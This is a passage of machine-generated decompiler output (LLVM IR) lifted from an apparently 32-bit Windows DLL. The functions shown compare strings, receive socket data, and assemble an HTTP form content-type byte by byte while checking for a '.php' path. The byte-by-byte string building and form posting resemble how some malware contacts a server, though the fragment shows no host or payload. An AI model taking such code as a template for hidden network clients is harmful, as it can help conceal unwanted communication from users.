  store i32 %515, i32* %ecx.2.reg2mem, !insn.addr !5788
  store i32 %245, i32* %esi.2.reg2mem, !insn.addr !5788
  br label %dec_label_pc_10009e23, !insn.addr !5788

dec_label_pc_10009e23:                            ; preds = %dec_label_pc_10009e23, %dec_label_pc_10009e21
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %524 = add i32 %523, %ecx.2.reload, !insn.addr !5789
  %525 = inttoptr i32 %524 to i8*, !insn.addr !5789
  %526 = load i8, i8* %525, align 1, !insn.addr !5789
  %527 = add i32 %ecx.2.reload, 1, !insn.addr !5790
  %528 = inttoptr i32 %ecx.2.reload to i8*, !insn.addr !5791
  store i8 %526, i8* %528, align 1, !insn.addr !5791
  %529 = add i32 %esi.2.reload, -1, !insn.addr !5792
  %530 = icmp eq i32 %529, 0, !insn.addr !5792
  %531 = icmp eq i1 %530, false, !insn.addr !5793
  store i32 %527, i32* %ecx.2.reg2mem, !insn.addr !5793
  store i32 %529, i32* %esi.2.reg2mem, !insn.addr !5793
  store i32 %518, i32* %esp.6.reg2mem, !insn.addr !5793
  br i1 %531, label %dec_label_pc_10009e23, label %dec_label_pc_10009e31, !insn.addr !5793

dec_label_pc_10009e31:                            ; preds = %dec_label_pc_10009e23, %dec_label_pc_10009e02, %dec_label_pc_10009dec, %dec_label_pc_10009d80
  %esp.6.reload = load i32, i32* %esp.6.reg2mem
  %532 = add i32 %esp.6.reload, -4, !insn.addr !5794
  %533 = inttoptr i32 %532 to i32*, !insn.addr !5794
  store i32 %207, i32* %533, align 4, !insn.addr !5794
  %534 = call i32 @"@__security_check_cookie@4"(), !insn.addr !5795
  ret i32 %534, !insn.addr !5796
}

define i32 @function_10009e60(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10009e60:
  %merge.reg2mem = alloca i32, !insn.addr !5797
  %esp.11.reg2mem = alloca i32, !insn.addr !5797
  %esi.1.reg2mem = alloca i32, !insn.addr !5797
  %ecx.1.reg2mem = alloca i32, !insn.addr !5797
  %esp.0.reg2mem = alloca i32, !insn.addr !5797
  %ebx.0.reg2mem = alloca i32, !insn.addr !5797
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-20 = alloca i32, align 4
  %2 = add i32 %0, -1, !insn.addr !5798
  %3 = icmp slt i32 %2, 0, !insn.addr !5799
  store i32 -1, i32* %merge.reg2mem, !insn.addr !5800
  br i1 %3, label %dec_label_pc_10009ee0, label %dec_label_pc_10009e73, !insn.addr !5800

dec_label_pc_10009e73:                            ; preds = %dec_label_pc_10009e60
  %4 = ptrtoint i32* %arg2 to i32
  %5 = ptrtoint i32* %stack_var_-20 to i32, !insn.addr !5801
  store i32 %2, i32* %ebx.0.reg2mem, !insn.addr !5802
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !5802
  br label %dec_label_pc_10009e80, !insn.addr !5802

dec_label_pc_10009e80:                            ; preds = %dec_label_pc_10009ecf, %dec_label_pc_10009e73
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %ecx.0 = load i32, i32* inttoptr (i32 268619880 to i32*), align 8
  %6 = icmp eq i32 %ecx.0, 0, !insn.addr !5803
  br i1 %6, label %dec_label_pc_10009e8f, label %dec_label_pc_10009ecb, !insn.addr !5804

dec_label_pc_10009e8f:                            ; preds = %dec_label_pc_10009e80
  %7 = mul i32 %ebx.0.reload, 4, !insn.addr !5805
  %8 = add i32 %7, %1, !insn.addr !5805
  %9 = inttoptr i32 %8 to i32*, !insn.addr !5805
  %10 = load i32, i32* %9, align 4, !insn.addr !5805
  %11 = add i32 %10, %arg1, !insn.addr !5806
  %12 = sub i32 %4, %11, !insn.addr !5807
  store i32 %11, i32* %ecx.1.reg2mem, !insn.addr !5808
  store i32 0, i32* %esi.1.reg2mem, !insn.addr !5808
  br label %dec_label_pc_10009ea0, !insn.addr !5808

dec_label_pc_10009ea0:                            ; preds = %dec_label_pc_10009eb9, %dec_label_pc_10009e8f
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %13 = inttoptr i32 %ecx.1.reload to i8*, !insn.addr !5809
  %14 = load i8, i8* %13, align 1, !insn.addr !5809
  %15 = add i32 %12, %ecx.1.reload, !insn.addr !5810
  %16 = inttoptr i32 %15 to i8*, !insn.addr !5810
  %17 = load i8, i8* %16, align 1, !insn.addr !5810
  %18 = icmp eq i8 %14, %17, !insn.addr !5811
  %19 = icmp eq i1 %18, false, !insn.addr !5812
  store i32 %esp.0.reload, i32* %esp.11.reg2mem, !insn.addr !5812
  br i1 %19, label %dec_label_pc_10009ecf, label %dec_label_pc_10009ea9, !insn.addr !5812

dec_label_pc_10009ea9:                            ; preds = %dec_label_pc_10009ea0
  %20 = icmp eq i8 %14, 0, !insn.addr !5813
  store i32 %ebx.0.reload, i32* %merge.reg2mem, !insn.addr !5814
  br i1 %20, label %dec_label_pc_10009ee0, label %dec_label_pc_10009ead, !insn.addr !5814

dec_label_pc_10009ead:                            ; preds = %dec_label_pc_10009ea9
  %21 = icmp eq i8 %17, 0, !insn.addr !5815
  store i32 %esp.0.reload, i32* %esp.11.reg2mem, !insn.addr !5816
  br i1 %21, label %dec_label_pc_10009ecf, label %dec_label_pc_10009eb9, !insn.addr !5816

dec_label_pc_10009eb9:                            ; preds = %dec_label_pc_10009ead
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %22 = add nuw nsw i32 %esi.1.reload, 1, !insn.addr !5817
  %23 = add i32 %ecx.1.reload, 1, !insn.addr !5818
  %24 = icmp ult i32 %22, 200, !insn.addr !5819
  store i32 %23, i32* %ecx.1.reg2mem, !insn.addr !5819
  store i32 %22, i32* %esi.1.reg2mem, !insn.addr !5819
  store i32 %esp.0.reload, i32* %esp.11.reg2mem, !insn.addr !5819
  br i1 %24, label %dec_label_pc_10009ea0, label %dec_label_pc_10009ecf, !insn.addr !5819

dec_label_pc_10009ecb:                            ; preds = %dec_label_pc_10009e80
  %25 = add i32 %esp.0.reload, -4, !insn.addr !5820
  %26 = inttoptr i32 %25 to i32*, !insn.addr !5820
  store i32 %4, i32* %26, align 4, !insn.addr !5820
  %27 = mul i32 %ebx.0.reload, 4, !insn.addr !5821
  %28 = add i32 %27, %1, !insn.addr !5821
  %29 = inttoptr i32 %28 to i32*, !insn.addr !5821
  %30 = load i32, i32* %29, align 4, !insn.addr !5821
  %31 = add i32 %30, %arg1, !insn.addr !5822
  %32 = add i32 %esp.0.reload, -8, !insn.addr !5823
  %33 = inttoptr i32 %32 to i32*, !insn.addr !5823
  store i32 %31, i32* %33, align 4, !insn.addr !5823
  %34 = call i32 @lstrcmpA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !5824
  %35 = icmp eq i32 %34, 0, !insn.addr !5825
  store i32 %32, i32* %esp.11.reg2mem, !insn.addr !5826
  store i32 %ebx.0.reload, i32* %merge.reg2mem, !insn.addr !5826
  br i1 %35, label %dec_label_pc_10009ee0, label %dec_label_pc_10009ecf, !insn.addr !5826

dec_label_pc_10009ecf:                            ; preds = %dec_label_pc_10009ea0, %dec_label_pc_10009ead, %dec_label_pc_10009eb9, %dec_label_pc_10009ecb
  %esp.11.reload = load i32, i32* %esp.11.reg2mem
  %36 = add i32 %ebx.0.reload, -1, !insn.addr !5827
  %37 = icmp slt i32 %36, 0, !insn.addr !5827
  %38 = icmp eq i1 %37, false, !insn.addr !5828
  store i32 %36, i32* %ebx.0.reg2mem, !insn.addr !5828
  store i32 %esp.11.reload, i32* %esp.0.reg2mem, !insn.addr !5828
  store i32 -1, i32* %merge.reg2mem, !insn.addr !5828
  br i1 %38, label %dec_label_pc_10009e80, label %dec_label_pc_10009ee0, !insn.addr !5828

dec_label_pc_10009ee0:                            ; preds = %dec_label_pc_10009ecb, %dec_label_pc_10009ecf, %dec_label_pc_10009ea9, %dec_label_pc_10009e60
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !5829
}

define i32 @function_10009f10(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009f10:
  %esi.1.reg2mem = alloca i32, !insn.addr !5830
  %edi.2.reg2mem = alloca i32, !insn.addr !5830
  %esp.1.reg2mem = alloca i32, !insn.addr !5830
  %edi.1.reg2mem = alloca i32, !insn.addr !5830
  %edi.0.reg2mem = alloca i32, !insn.addr !5830
  %esi.0.reg2mem = alloca i32, !insn.addr !5830
  %esp.0.reg2mem = alloca i32, !insn.addr !5830
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-127 = alloca i32, align 4
  %stack_var_-220 = alloca i8*, align 4
  %stack_var_-136 = alloca i32, align 4
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-128 = alloca i128, align 8
  %3 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 1414745936, i32* %stack_var_-24, align 4, !insn.addr !5831
  %4 = inttoptr i32 %arg2 to i8*, !insn.addr !5832
  call void @__asm_rep_stosd_memset(i8* %4, i32 0, i32 35000), !insn.addr !5832
  %5 = icmp eq i32 %arg1, 0, !insn.addr !5833
  %6 = icmp eq i1 %5, false, !insn.addr !5834
  br i1 %6, label %dec_label_pc_10009fa4, label %dec_label_pc_10009f52, !insn.addr !5834

dec_label_pc_10009f52:                            ; preds = %dec_label_pc_10009f10
  %7 = call i32 @function_1000ce70(), !insn.addr !5835
  %8 = icmp eq i32 %7, -1, !insn.addr !5836
  %9 = icmp eq i1 %8, false, !insn.addr !5837
  br i1 %9, label %dec_label_pc_10009f73, label %dec_label_pc_10009f60, !insn.addr !5837

dec_label_pc_10009f60:                            ; preds = %dec_label_pc_10009f52
  %10 = call i32 @"@__security_check_cookie@4"(), !insn.addr !5838
  ret i32 %10, !insn.addr !5839

dec_label_pc_10009f73:                            ; preds = %dec_label_pc_10009f52
  %11 = call i32 @recv(i32 %7, i8* %4, i32 140000, i32 0), !insn.addr !5840
  %12 = sub i32 140000, %11, !insn.addr !5841
  %13 = add i32 %11, %arg2, !insn.addr !5842
  %14 = inttoptr i32 %13 to i8*, !insn.addr !5843
  %15 = call i32 @recv(i32 %7, i8* %14, i32 %12, i32 0), !insn.addr !5844
  %16 = call i32 @closesocket(i32 %7), !insn.addr !5845
  br label %dec_label_pc_1000a22f, !insn.addr !5846

dec_label_pc_10009fa4:                            ; preds = %dec_label_pc_10009f10
  %17 = load i128, i128* @global_var_10039c20, align 4, !insn.addr !5847
  %18 = call i128 @__asm_movaps(i128 %17), !insn.addr !5847
  call void @__asm_movups(i128 %3, i128 %18), !insn.addr !5848
  %19 = load i128, i128* @global_var_100399f0, align 4, !insn.addr !5849
  %20 = call i128 @__asm_movaps(i128 %19), !insn.addr !5849
  call void @__asm_movups(i128 %2, i128 %20), !insn.addr !5850
  %21 = call i128 @__asm_movaps(i128 521286166512744085559482823493185382), !insn.addr !5851
  call void @__asm_movups(i128 %1, i128 %21), !insn.addr !5852
  %22 = call i32* @LocalAlloc(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5853
  %23 = ptrtoint i32* %22 to i32, !insn.addr !5853
  store i32 %23, i32* %stack_var_-136, align 4, !insn.addr !5854
  %24 = inttoptr i32 %0 to i8*, !insn.addr !5855
  store i8* %24, i8** %stack_var_-220, align 4, !insn.addr !5855
  %25 = ptrtoint i8** %stack_var_-220 to i32, !insn.addr !5855
  %26 = bitcast i32* %22 to i8*, !insn.addr !5856
  store i8 97, i8* %26, align 1, !insn.addr !5856
  %27 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5857
  %28 = add i32 %27, 1, !insn.addr !5858
  %29 = inttoptr i32 %28 to i8*, !insn.addr !5858
  store i8 112, i8* %29, align 1, !insn.addr !5858
  %30 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5859
  %31 = add i32 %30, 2, !insn.addr !5860
  %32 = inttoptr i32 %31 to i8*, !insn.addr !5860
  store i8 112, i8* %32, align 1, !insn.addr !5860
  %33 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5861
  %34 = add i32 %33, 3, !insn.addr !5862
  %35 = inttoptr i32 %34 to i8*, !insn.addr !5862
  store i8 108, i8* %35, align 1, !insn.addr !5862
  %36 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5863
  %37 = add i32 %36, 4, !insn.addr !5864
  %38 = inttoptr i32 %37 to i8*, !insn.addr !5864
  store i8 105, i8* %38, align 1, !insn.addr !5864
  %39 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5865
  %40 = add i32 %39, 5, !insn.addr !5866
  %41 = inttoptr i32 %40 to i8*, !insn.addr !5866
  store i8 99, i8* %41, align 1, !insn.addr !5866
  %42 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5867
  %43 = add i32 %42, 6, !insn.addr !5868
  %44 = inttoptr i32 %43 to i8*, !insn.addr !5868
  store i8 97, i8* %44, align 1, !insn.addr !5868
  %45 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5869
  %46 = add i32 %45, 7, !insn.addr !5870
  %47 = inttoptr i32 %46 to i8*, !insn.addr !5870
  store i8 116, i8* %47, align 1, !insn.addr !5870
  %48 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5871
  %49 = add i32 %48, 8, !insn.addr !5872
  %50 = inttoptr i32 %49 to i8*, !insn.addr !5872
  store i8 105, i8* %50, align 1, !insn.addr !5872
  %51 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5873
  %52 = add i32 %51, 9, !insn.addr !5874
  %53 = inttoptr i32 %52 to i8*, !insn.addr !5874
  store i8 111, i8* %53, align 1, !insn.addr !5874
  %54 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5875
  %55 = add i32 %54, 10, !insn.addr !5876
  %56 = inttoptr i32 %55 to i8*, !insn.addr !5876
  store i8 110, i8* %56, align 1, !insn.addr !5876
  %57 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5877
  %58 = add i32 %57, 11, !insn.addr !5878
  %59 = inttoptr i32 %58 to i8*, !insn.addr !5878
  store i8 47, i8* %59, align 1, !insn.addr !5878
  %60 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5879
  %61 = add i32 %60, 12, !insn.addr !5880
  %62 = inttoptr i32 %61 to i8*, !insn.addr !5880
  store i8 120, i8* %62, align 1, !insn.addr !5880
  %63 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5881
  %64 = add i32 %63, 13, !insn.addr !5882
  %65 = inttoptr i32 %64 to i8*, !insn.addr !5882
  store i8 45, i8* %65, align 1, !insn.addr !5882
  %66 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5883
  %67 = add i32 %66, 14, !insn.addr !5884
  %68 = inttoptr i32 %67 to i8*, !insn.addr !5884
  store i8 119, i8* %68, align 1, !insn.addr !5884
  %69 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5885
  %70 = add i32 %69, 15, !insn.addr !5886
  %71 = inttoptr i32 %70 to i8*, !insn.addr !5886
  store i8 119, i8* %71, align 1, !insn.addr !5886
  %72 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5887
  %73 = add i32 %72, 16, !insn.addr !5888
  %74 = inttoptr i32 %73 to i8*, !insn.addr !5888
  store i8 119, i8* %74, align 1, !insn.addr !5888
  %75 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5889
  %76 = add i32 %75, 17, !insn.addr !5890
  %77 = inttoptr i32 %76 to i8*, !insn.addr !5890
  store i8 45, i8* %77, align 1, !insn.addr !5890
  %78 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5891
  %79 = add i32 %78, 18, !insn.addr !5892
  %80 = inttoptr i32 %79 to i8*, !insn.addr !5892
  store i8 102, i8* %80, align 1, !insn.addr !5892
  %81 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5893
  %82 = add i32 %81, 19, !insn.addr !5894
  %83 = inttoptr i32 %82 to i8*, !insn.addr !5894
  store i8 111, i8* %83, align 1, !insn.addr !5894
  %84 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5895
  %85 = add i32 %84, 20, !insn.addr !5896
  %86 = inttoptr i32 %85 to i8*, !insn.addr !5896
  store i8 114, i8* %86, align 1, !insn.addr !5896
  %87 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5897
  %88 = add i32 %87, 21, !insn.addr !5898
  %89 = inttoptr i32 %88 to i8*, !insn.addr !5898
  store i8 109, i8* %89, align 1, !insn.addr !5898
  %90 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5899
  %91 = add i32 %90, 22, !insn.addr !5900
  %92 = inttoptr i32 %91 to i8*, !insn.addr !5900
  store i8 45, i8* %92, align 1, !insn.addr !5900
  %93 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5901
  %94 = add i32 %93, 23, !insn.addr !5902
  %95 = inttoptr i32 %94 to i8*, !insn.addr !5902
  store i8 117, i8* %95, align 1, !insn.addr !5902
  %96 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5903
  %97 = add i32 %96, 24, !insn.addr !5904
  %98 = inttoptr i32 %97 to i8*, !insn.addr !5904
  store i8 114, i8* %98, align 1, !insn.addr !5904
  %99 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5905
  %100 = add i32 %99, 25, !insn.addr !5906
  %101 = inttoptr i32 %100 to i8*, !insn.addr !5906
  store i8 108, i8* %101, align 1, !insn.addr !5906
  %102 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5907
  %103 = add i32 %102, 26, !insn.addr !5908
  %104 = inttoptr i32 %103 to i8*, !insn.addr !5908
  store i8 101, i8* %104, align 1, !insn.addr !5908
  %105 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5909
  %106 = add i32 %105, 27, !insn.addr !5910
  %107 = inttoptr i32 %106 to i8*, !insn.addr !5910
  store i8 110, i8* %107, align 1, !insn.addr !5910
  %108 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5911
  %109 = add i32 %108, 28, !insn.addr !5912
  %110 = inttoptr i32 %109 to i8*, !insn.addr !5912
  store i8 99, i8* %110, align 1, !insn.addr !5912
  %111 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5913
  %112 = add i32 %111, 29, !insn.addr !5914
  %113 = inttoptr i32 %112 to i8*, !insn.addr !5914
  store i8 111, i8* %113, align 1, !insn.addr !5914
  %114 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5915
  %115 = add i32 %114, 30, !insn.addr !5916
  %116 = inttoptr i32 %115 to i8*, !insn.addr !5916
  store i8 100, i8* %116, align 1, !insn.addr !5916
  %117 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5917
  %118 = add i32 %117, 31, !insn.addr !5918
  %119 = inttoptr i32 %118 to i8*, !insn.addr !5918
  store i8 101, i8* %119, align 1, !insn.addr !5918
  %120 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5919
  %121 = add i32 %120, 32, !insn.addr !5920
  %122 = inttoptr i32 %121 to i8*, !insn.addr !5920
  store i8 100, i8* %122, align 1, !insn.addr !5920
  %123 = load i32, i32* %stack_var_-136, align 4, !insn.addr !5921
  %124 = add i32 %123, 33, !insn.addr !5922
  %125 = inttoptr i32 %124 to i8*, !insn.addr !5922
  store i8 0, i8* %125, align 1, !insn.addr !5922
  %126 = load i8*, i8** %stack_var_-220, align 4, !insn.addr !5923
  %127 = call i32 @lstrlenA(i8* %126), !insn.addr !5923
  %128 = icmp slt i32 %127, 1
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !5924
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !5924
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !5924
  store i32 %25, i32* %esp.1.reg2mem, !insn.addr !5924
  store i32 0, i32* %edi.2.reg2mem, !insn.addr !5924
  br i1 %128, label %dec_label_pc_1000a1b1, label %dec_label_pc_1000a180, !insn.addr !5924

dec_label_pc_1000a180:                            ; preds = %dec_label_pc_10009fa4, %dec_label_pc_1000a1a5
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %129 = add i32 %esi.0.reload, %0
  %130 = inttoptr i32 %129 to i8*, !insn.addr !5925
  %131 = load i8, i8* %130, align 1, !insn.addr !5925
  %132 = icmp eq i8 %131, 46, !insn.addr !5925
  %133 = icmp eq i1 %132, false, !insn.addr !5926
  store i32 %edi.0.reload, i32* %edi.1.reg2mem, !insn.addr !5926
  br i1 %133, label %dec_label_pc_1000a1a5, label %dec_label_pc_1000a189, !insn.addr !5926

dec_label_pc_1000a189:                            ; preds = %dec_label_pc_1000a180
  %134 = add i32 %129, 1, !insn.addr !5927
  %135 = inttoptr i32 %134 to i8*, !insn.addr !5927
  %136 = load i8, i8* %135, align 1, !insn.addr !5927
  %137 = icmp eq i8 %136, 112, !insn.addr !5927
  %138 = icmp eq i1 %137, false, !insn.addr !5928
  store i32 %edi.0.reload, i32* %edi.1.reg2mem, !insn.addr !5928
  br i1 %138, label %dec_label_pc_1000a1a5, label %dec_label_pc_1000a190, !insn.addr !5928

dec_label_pc_1000a190:                            ; preds = %dec_label_pc_1000a189
  %139 = add i32 %129, 2, !insn.addr !5929
  %140 = inttoptr i32 %139 to i8*, !insn.addr !5929
  %141 = load i8, i8* %140, align 1, !insn.addr !5929
  %142 = icmp eq i8 %141, 104, !insn.addr !5929
  %143 = icmp eq i1 %142, false, !insn.addr !5930
  store i32 %edi.0.reload, i32* %edi.1.reg2mem, !insn.addr !5930
  br i1 %143, label %dec_label_pc_1000a1a5, label %dec_label_pc_1000a197, !insn.addr !5930

dec_label_pc_1000a197:                            ; preds = %dec_label_pc_1000a190
  %144 = add i32 %129, 3, !insn.addr !5931
  %145 = inttoptr i32 %144 to i8*, !insn.addr !5931
  %146 = load i8, i8* %145, align 1, !insn.addr !5931
  %147 = icmp eq i8 %146, 112, !insn.addr !5931
  %148 = icmp eq i1 %147, false, !insn.addr !5932
  store i32 %edi.0.reload, i32* %edi.1.reg2mem, !insn.addr !5932
  br i1 %148, label %dec_label_pc_1000a1a5, label %dec_label_pc_1000a19e, !insn.addr !5932

dec_label_pc_1000a19e:                            ; preds = %dec_label_pc_1000a197
  %149 = add i32 %129, 4, !insn.addr !5933
  %150 = inttoptr i32 %149 to i8*, !insn.addr !5933
  store i8 0, i8* %150, align 1, !insn.addr !5933
  %151 = add i32 %129, 5, !insn.addr !5934
  store i32 %151, i32* %edi.1.reg2mem, !insn.addr !5934
  br label %dec_label_pc_1000a1a5, !insn.addr !5934

dec_label_pc_1000a1a5:                            ; preds = %dec_label_pc_1000a19e, %dec_label_pc_1000a197, %dec_label_pc_1000a190, %dec_label_pc_1000a189, %dec_label_pc_1000a180
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %152 = add i32 %esp.0.reload, -4, !insn.addr !5935
  %153 = inttoptr i32 %152 to i32*, !insn.addr !5935
  %154 = add nuw nsw i32 %esi.0.reload, 1, !insn.addr !5936
  %155 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !5937
  %156 = icmp slt i32 %154, %155, !insn.addr !5938
  store i32 %152, i32* %esp.0.reg2mem, !insn.addr !5938
  store i32 %154, i32* %esi.0.reg2mem, !insn.addr !5938
  store i32 %edi.1.reload, i32* %edi.0.reg2mem, !insn.addr !5938
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !5938
  store i32 %edi.1.reload, i32* %edi.2.reg2mem, !insn.addr !5938
  br i1 %156, label %dec_label_pc_1000a180, label %dec_label_pc_1000a1b1, !insn.addr !5938

dec_label_pc_1000a1b1:                            ; preds = %dec_label_pc_1000a1a5, %dec_label_pc_10009fa4
  %157 = ptrtoint i32* %stack_var_-148 to i32, !insn.addr !5939
  %edi.2.reload = load i32, i32* %edi.2.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %158 = add i32 %esp.1.reload, -4, !insn.addr !5940
  %159 = inttoptr i32 %158 to i32*, !insn.addr !5940
  store i32 0, i32* %159, align 4, !insn.addr !5940
  %160 = add i32 %esp.1.reload, -8, !insn.addr !5941
  %161 = inttoptr i32 %160 to i32*, !insn.addr !5941
  store i32 -2080374784, i32* %161, align 4, !insn.addr !5941
  %162 = add i32 %esp.1.reload, -12, !insn.addr !5942
  %163 = inttoptr i32 %162 to i32*, !insn.addr !5942
  %164 = ptrtoint i32* %stack_var_-136 to i32, !insn.addr !5942
  store i32 %164, i32* %163, align 4, !insn.addr !5942
  %165 = add i32 %esp.1.reload, -16, !insn.addr !5943
  %166 = inttoptr i32 %165 to i32*, !insn.addr !5943
  store i32 0, i32* %166, align 4, !insn.addr !5943
  %167 = add i32 %esp.1.reload, -20, !insn.addr !5944
  %168 = inttoptr i32 %167 to i32*, !insn.addr !5944
  store i32 0, i32* %168, align 4, !insn.addr !5944
  %169 = add i32 %esp.1.reload, -24, !insn.addr !5945
  %170 = inttoptr i32 %169 to i32*, !insn.addr !5945
  %171 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !5946
  %172 = add i32 %esp.1.reload, -28, !insn.addr !5947
  %173 = inttoptr i32 %172 to i32*, !insn.addr !5947
  store i32 %171, i32* %173, align 4, !insn.addr !5947
  %174 = add i32 %esp.1.reload, -32, !insn.addr !5948
  %175 = inttoptr i32 %174 to i32*, !insn.addr !5948
  store i32 %157, i32* %175, align 4, !insn.addr !5948
  %176 = ptrtoint i128* %stack_var_-128 to i32, !insn.addr !5949
  store i32 %176, i32* %esi.1.reg2mem, !insn.addr !5950
  br label %dec_label_pc_1000a1e4, !insn.addr !5950

dec_label_pc_1000a1e4:                            ; preds = %dec_label_pc_1000a1e4, %dec_label_pc_1000a1b1
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %177 = inttoptr i32 %esi.1.reload to i8*, !insn.addr !5951
  %178 = load i8, i8* %177, align 1, !insn.addr !5951
  %179 = add i32 %esi.1.reload, 1, !insn.addr !5952
  %180 = icmp eq i8 %178, 0, !insn.addr !5953
  %181 = icmp eq i1 %180, false, !insn.addr !5954
  store i32 %179, i32* %esi.1.reg2mem, !insn.addr !5954
  br i1 %181, label %dec_label_pc_1000a1e4, label %dec_label_pc_1000a1eb, !insn.addr !5954

dec_label_pc_1000a1eb:                            ; preds = %dec_label_pc_1000a1e4
  %182 = ptrtoint i32* %stack_var_-127 to i32, !insn.addr !5950
  %183 = add i32 %esp.1.reload, -36, !insn.addr !5955
  %184 = inttoptr i32 %183 to i32*, !insn.addr !5955
  store i32 %edi.2.reload, i32* %184, align 4, !insn.addr !5955
  %185 = sub i32 %179, %182, !insn.addr !5956
  %186 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !5957
  %187 = add i32 %esp.1.reload, -40, !insn.addr !5958
  %188 = inttoptr i32 %187 to i32*, !insn.addr !5958
  store i32 %186, i32* %188, align 4, !insn.addr !5958
  %189 = add i32 %esp.1.reload, -44, !insn.addr !5959
  %190 = inttoptr i32 %189 to i32*, !insn.addr !5959
  store i32 %edi.2.reload, i32* %190, align 4, !insn.addr !5959
  %191 = add i32 %esp.1.reload, -48, !insn.addr !5960
  %192 = inttoptr i32 %191 to i32*, !insn.addr !5960
  store i32 %185, i32* %192, align 4, !insn.addr !5960
  %193 = add i32 %esp.1.reload, -52, !insn.addr !5961
  %194 = inttoptr i32 %193 to i32*, !insn.addr !5961
  store i32 %176, i32* %194, align 4, !insn.addr !5961
  %195 = add i32 %esp.1.reload, -56, !insn.addr !5962
  %196 = inttoptr i32 %195 to i32*, !insn.addr !5962
  store i32 %171, i32* %196, align 4, !insn.addr !5962
  %197 = add i32 %esp.1.reload, -60, !insn.addr !5963
  %198 = inttoptr i32 %197 to i32*, !insn.addr !5963
  %199 = ptrtoint i32* %stack_var_-152 to i32, !insn.addr !5963
  store i32 %199, i32* %198, align 4, !insn.addr !5963
  %200 = add i32 %esp.1.reload, -64, !insn.addr !5964
  %201 = inttoptr i32 %200 to i32*, !insn.addr !5964
  store i32 140000, i32* %201, align 4, !insn.addr !5964
  %202 = add i32 %esp.1.reload, -68, !insn.addr !5965
  %203 = inttoptr i32 %202 to i32*, !insn.addr !5965
  store i32 %arg2, i32* %203, align 4, !insn.addr !5965
  %204 = add i32 %esp.1.reload, -72, !insn.addr !5966
  %205 = inttoptr i32 %204 to i32*, !insn.addr !5966
  store i32 %171, i32* %205, align 4, !insn.addr !5966
  %206 = add i32 %esp.1.reload, -76, !insn.addr !5967
  %207 = inttoptr i32 %206 to i32*, !insn.addr !5967
  store i32 %171, i32* %207, align 4, !insn.addr !5967
  %208 = add i32 %esp.1.reload, -80, !insn.addr !5968
  %209 = inttoptr i32 %208 to i32*, !insn.addr !5968
  store i32 %157, i32* %209, align 4, !insn.addr !5968
  br label %dec_label_pc_1000a22f, !insn.addr !5969

dec_label_pc_1000a22f:                            ; preds = %dec_label_pc_1000a1eb, %dec_label_pc_10009f73
  %210 = call i32 @"@__security_check_cookie@4"(), !insn.addr !5970
  ret i32 %210, !insn.addr !5971
}

define i32 @function_1000a250() local_unnamed_addr {
dec_label_pc_1000a250:
  %esi.0.reg2mem = alloca i32, !insn.addr !5972
  %stack_var_-10016.0.reg2mem = alloca i32, !insn.addr !5972
  %esp.0.reg2mem = alloca i32, !insn.addr !5972
  %stack_var_-10008 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-10024 = alloca i16*, align 4
